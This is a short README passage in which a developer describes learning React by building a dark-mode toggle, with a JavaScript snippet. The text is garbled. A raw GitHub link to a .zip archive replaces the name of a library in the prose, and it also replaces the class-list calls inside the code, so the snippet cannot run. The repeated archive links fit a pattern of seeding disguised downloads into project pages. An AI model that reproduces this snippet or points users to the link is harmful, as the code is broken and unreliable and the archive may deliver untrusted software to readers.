### What I learned

This project helped me improve my skills with React and https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip, especially in implementing dynamic features like dark mode toggling. Hereâ€™s an example of how I applied dark mode toggle functionality:

```js
const toggleDarkMode = () => {
  setDarkMode(prevMode => !prevMode);
};

useEffect(() => {
  if (darkMode) {
    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
  } else {
    https://raw.githubusercontent.com/ANIKETPANWAR714/investo-assessment/main/muskmelon/investo-assessment.zip('dark');
  }
}, [darkMode]);
